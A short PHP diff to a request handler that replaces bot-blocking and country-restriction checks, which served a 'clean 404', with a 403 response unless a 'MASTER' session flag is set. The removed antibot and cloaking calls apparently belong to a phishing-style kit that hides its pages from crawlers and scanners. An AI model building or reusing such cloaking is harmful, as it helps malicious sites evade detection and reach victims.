@@ -3,9 +3,12 @@ session_start();
 include __DIR__ . '/settings.php';
 include __DIR__ . '/lang_main.php';
 require_once __DIR__ . '/antibot.php';
-checkSearchEngineBot(); // Block search bots on handler
-if (!checkCountryRestriction()) { // Block if not from allowed countries
-    showClean404();
+
+// Validate MASTER session
+if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
+    http_response_code(403);
+    echo json_encode(['error' => 'Unauthorized']);
+    exit;
 }
 
 header('Content-Type: application/json');
